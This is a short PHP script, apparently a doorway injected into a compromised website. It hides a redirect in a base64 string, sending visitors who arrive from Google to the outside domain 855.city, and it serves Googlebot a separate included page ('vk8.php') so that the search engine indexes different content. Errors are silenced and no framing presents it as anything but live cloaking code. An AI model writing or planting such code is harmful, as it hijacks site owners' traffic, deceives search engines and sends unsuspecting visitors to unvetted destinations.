<?php  
set_time_limit(0);            //   
error_reporting(0);           //   
header("Content-Type: text/html;charset=utf-8"); //   
  
//   
$isFromGoogleSearch = false;  
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : ''; //   
$targetCountry = 'zh-HK'; //   
$userLang = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 5) : ''; //   

// .'.'  
if (strpos(strtolower($ref), 'google.') !== false) {  
    $isFromGoogleSearch = true;  
}  
  
//   
if ($isFromGoogleSearch && $userLang !== $targetCountry) {  
     
    echo base64_decode('PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDsgdXJsPWh0dHBzOi8vODU1LmNpdHkiPg==');  
    exit;  
}  
  
//   
$userAgent = $_SERVER['HTTP_USER_AGENT'];  
$searchEngines = ['Googlebot']; //   
$isSearchEngineBot = false;  
  
foreach ($searchEngines as $engine) {  
    if (preg_match("/$engine/i", $userAgent)) {  
        $isSearchEngineBot = true;  
        break;  
    }  
}  
  
  
if ($isSearchEngineBot) {  
   
   $pages = ['vk8.php', 'vk8.php', 'vk8.php', 'vk8.php', 'vk8.php'];    
$randomPage = $pages[array_rand($pages)]; 
  
ob_start();  
  
include $randomPage;     
$pageContent = ob_get_clean();
      
    echo $pageContent;   
    exit; 
} else {  

   
}  
  
 
?>vk8
